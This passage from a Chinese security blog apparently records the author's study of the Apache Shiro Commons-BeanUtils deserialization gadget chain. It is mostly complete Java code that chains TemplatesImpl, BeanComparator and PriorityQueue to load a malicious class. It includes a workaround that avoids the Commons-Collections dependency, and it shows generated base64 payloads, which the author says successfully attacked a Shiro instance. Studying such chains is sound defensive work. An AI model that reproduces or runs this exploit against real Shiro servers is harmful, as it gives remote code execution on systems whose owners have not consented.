class="comment">//JaeyahKC7iOYIv3sqn1GYINNpoNxUZnDIpfC3YmKVm2VHggdgo/OWlvllwbqShJ3Ips0Z6RIPgqvag0aQ/gY1GFAce/dBbKejqvDbmoC9b97qzSzPWtrrraqxJ7slSKLGtdsyLOeY4RAl0m3JpKj+H/MFEYxV9HDdaeLfieFoBDlLBD2PGQFrS5EJHdavN34ZMCs4svg6MpbF/poqU8o7xZpsb91/VJ7NPATbuZOTcoMzG1KcCi3e0wHlFVaRM41IjW2b/1GkC70lAogdFbv2BnTNAonYm+xCb8TaCpfqaG+zHTeIMj0hjgi9j/StWcqPeWZIJojTJNE7/JSP+79OAynOrWqRxZ2UtobVtw57Ot5LoGYKPnxc3N7GP5ZY49ZNs42S12gLmQqH/xF/Zp33mXJLyP1UNrSNIF1oA9k4YyRVjmdm9HMtz2sfKZgfciHrz0lqstrwwb0OxRhdMq3/eE4OqxnhM26cANItGtY1hnVfGueQdRwGjTH3jcdQMiHhK4IZPBCfyoAACJtFCtYDiVk8GsYzDHy/nxIX0veI7J8Np3Rt73kj4Ax8g9mSwQADb8T2XSH4MJith4BvIwUMMOyToz3HW8cwzs6ZYmOUW0Fl8GOfKPzvlEo0IvYXllerte7cd7hxrTLI3bXjwl8ju9J7+8Cl0TZAOGs95s+qYKXkYeNZ8P8Xd980xj/F2CxfFJ3TtI4H2wkr9qkBpOmJ5g8I98y2bc6WZxqZXzjNr55yKghsi7DMGP9SFNuT9y6o242OSHVZkdZ3FdVlM5onHxs3qREIpjVnjz6hlSiTGjoH0LM26OjbGGfXYLsNY9e6pw1kt84D8URed/fiNEBQE8qQCgyxjUELiFwtGMSlnZNlh5qEEoyVF5UEvkfCrX1qixhDq135ex1JYpCjyK56q+QiB4nB6g1d2829xJOx9fu+pcVptiewUd736qeOBANiqPVazMQhU68xRPoThfvLa4dHOrIxW2bpOpyVXyxojrPkX6Y1wCIlXqM+sH77+8LfLCcJgdhFjm9CCso9SrKnAZhTfMl1X2aXMlVtCBmcSXwmf53ur7kt1nQGZfHb6XCqwCBtxqwPLm3KwpKuV4oD3RjjQV9ffM7BWyEdrNwtgo9Eyo0vRyyUUcl5zjwS8AoP0LiTgnmX6Mdj+6cQHVx9ijuMIbAw9VF0d9hfFtc3qsdbglWx08edupmeEpUre5aHe+fyAoP1+LruBWawdQCt/6aClzaI6QDijIMothRpUwz4+HN7YYoCrbKl9niSwOT0pDf9woU5xWCMD3ZWO4ZG2CAR23L1YnS2VrlrNg=&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735028766210-b275f81d-d018-4321-b4c1-2b93e2234d4b.png"></p>
<h3 id="Vmycx">CB链</h3>
shiro框架本身是不带cc的依赖的，上次打cc依赖是我们自己加的，这次我们把这个cc依赖删掉，去打他本身的CB依赖（commons-beanutils）

<h4 id="DEXts">javabean</h4>
javabean是一个遵循特定写法的Java类

<p>特点：</p>
<ol>
<li>这个Java类必须有一个无参构造方法</li>
<li>属性必须私有化</li>
<li>私有化的属性必须通过public类型的方法暴露给其他程序，并且命名也遵循一定的命名规范</li>
</ol>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123; <span class="keyword">return</span> <span class="built_in">this</span>.name&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123; <span class="keyword">return</span> <span class="built_in">this</span>.name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">()</span>&#123; <span class="built_in">this</span>.age = age; &#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>如果想获取Javabean的私有属性，我们只能通过以下这种方式获取，但是在CB中为了能够动态的获取Javabean的私有属性，所以构造了一个PropertyUtils.getProperty方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aaa&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        System.out.println(person.getName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PropertyUtils.getProperty的使用示例如下，他就会自动的去调用Person类的get方法，我们传入的是name属性，它会自动把这个属性的命名自动改为固定格式的形式，这里就会转为’Name’，调用的方法就是getName和setName方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aaa&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person,<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="FAbOm">getOutputProperites</h4>
在`TemplatesImpl`中有一个`getOutputProperties`方法，这个格式的命名就很符合Javabean，且他的方法调用了`newTransformer`方法，他是可以动态加载类的

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们尝试用这个来执行一下代码</p>
<p>调用<code>getOutputProperties</code>就可以成功加载恶意类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="iPf3O">CB攻击链分析 </h4>
<h5 id="PqGts">逻辑理解</h5>
现在我们需要找谁调用了这个PropertyUtils.getProperty方法，我们可以在BeanComparetor中找到它的身影，在它的compare中调用了这PropertyUtils.getProperty方法，且this.property我们也是可以控制的

<p>正好我们之前也有调用compare的入口方法，这样就接上了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//BeanComparetor</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.property == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.comparator.compare(o1, o2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1, <span class="built_in">this</span>.property);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty(o2, <span class="built_in">this</span>.property);</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.comparator.compare(value1, value2);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="type">IllegalAccessException</span> <span class="variable">iae</span> <span class="operator">=</span> var5;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="type">InvocationTargetException</span> <span class="variable">ite</span> <span class="operator">=</span> var6;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">                <span class="type">NoSuchMethodException</span> <span class="variable">nsme</span> <span class="operator">=</span> var7;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大概就是这样的，我们来验证一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735114633223-cd497c08-e608-4861-a437-be208906425d.png"></p>
<p>最终代码如下（这个是自己思考的哟，自己写出来的，但是中间有好多东西都迷糊，看一下组长的把）</p>
<p>思考了一下，add的参数是数字时候，会调用Integer类的getOutputProperties方法，而它是没有这个方法的，所以会报错，我这里通过反射修改size的值，以便达到遍历的目的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(beanComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">PriorityQueue</span>&gt; aClass = priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(priorityQueue, <span class="number">2</span>);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="Z5Oeo">调整</h5>
但是在用来打shiro的时候，会报一个错误

<p>因为在CB编写的时候，就有些东西是和CC来配合的，在<code>BeanComparator</code>的构造函数中，会默认调用<code>ComparableComparator</code>的<code>getInstance</code>方法，而<code>ComparableComparator</code>是cc依赖中的，shiro中默认没有带cc依赖，导致的错误发生</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanComparator</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> String property;</span><br><span class="line">    <span class="keyword">private</span> Comparator comparator;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>((String)<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">(String property)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(property, ComparableComparator.getInstance());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>而<code>BeanComparator</code>还有一个构造函数如下，里面的<code>Comparator</code>是可以自己传的，所以我们可以用这个构造函数来绕过cc的依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">(String property, Comparator comparator)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setProperty(property);</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我自己的代码如下</p>
<p>在<code>beanComparator</code>这里传入一个不为cc依赖的<code>Comparator</code>即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> <span class="title class_">BeanComparator</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(beanComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">PriorityQueue</span>&gt; aClass = priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(priorityQueue, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>生成payload后，去打shiro框架（不知道为什么在）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">6JedmeHoSoeUuSUAr/U5YdK2+ZpPPD5aofKFBFoKOp<span class="comment">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</span></span><br></pre></td></tr></table></figure>

<p>也是成功加载了恶意代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735122730744-e269048e-762c-42b2-aa73-bd6cd5a95f7e.png"></p>
<h5 id="NfPt4">组长的代码~</h5>
组长的代码如下，组长的代码是在add方法时候会报错导致序列化不成功（这里是在传入Intger时，也会调用Integer类的getOutputProperties的方法，但是他实际没有这个方法所以报错），所以在向PriorityQueue传入Comparator时，组长传入一个无用的`TransformingComparator`，然后通过反射修改回来（这里还有一个方法，在add时，只添加数字，后续通过反射修改回来）

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> <span class="title class_">BeanComparator</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;PriorityQueue&gt; priorityQueueClass = PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>生成payload后，也是能成功打通的（还是组长的好哇）</p>
